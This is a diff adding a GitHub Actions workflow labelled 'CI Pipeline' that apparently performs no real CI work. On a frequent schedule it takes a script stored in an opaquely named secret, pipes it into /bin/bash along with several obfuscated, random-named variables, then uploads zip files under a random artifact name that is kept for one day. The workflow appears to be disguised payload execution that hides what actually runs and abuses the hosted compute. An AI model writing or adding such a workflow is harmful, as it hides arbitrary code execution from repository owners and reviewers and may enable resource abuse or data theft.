@@ -1,0 +1,34 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '16 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          vx8: ${{ secrets.vx8 }}
+        run: |
+          printf '%s' "$vx8" | jq -r .rwx292 | /bin/bash
+          echo $qu108 | jq -r .xns22086 | /bin/bash
+          printf '%s' "$urib53375" | jq -r .dmpf2 | /bin/bash
+          echo $ik5 | jq -r .vycrp77984 | /bin/bash
+          echo $tiw5894 | jq -r .hoy24 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: s4HxsNOX
+          path: "*.zip"
+          retention-days: 1
